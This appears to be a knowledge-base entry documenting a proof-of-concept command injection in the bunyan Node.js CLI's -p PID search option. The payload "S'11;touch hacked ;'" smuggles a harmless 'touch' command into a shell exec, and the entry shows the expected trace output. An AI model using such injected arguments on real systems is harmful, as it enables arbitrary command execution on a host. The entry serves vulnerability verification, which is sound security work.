---
id: cmd-uuid-3
data: BUNYAN_SELF_TRACE=1 ./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
tags:
  - debugging
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Node.js
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.127Z'
verified: false
validated: true
submitted: true
---
# bunyan-trace-injection

## Command

```bash
BUNYAN_SELF_TRACE=1 ./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
```

## Description

Runs the bunyan CLI with self-tracing enabled to log the exact child_process.exec command, verifying the command injection in the PID search.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `BUNYAN_SELF_TRACE=1` | Environment variable enabling debug tracing | Yes |
| `-p` | PID search option | Yes |
| `"S'11;touch hacked ;'"` | Injection payload | Yes |

## Examples

### Basic Usage

```bash
BUNYAN_SELF_TRACE=1 ./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
```

### Advanced Usage

```bash
BUNYAN_SELF_TRACE=1 bunyan -p "S'11;touch hacked ;'\""
```

## Expected Output

Trace log: "[bunyan self-trace] exec cmd: \"ps -A -o pid,command | grep '[S]'11;touch hacked ;'\"", followed by PID error and file creation.

## Related

- [[Related Procedure|procedures/Exploit-Bunyan-PID-Search-Injection]]
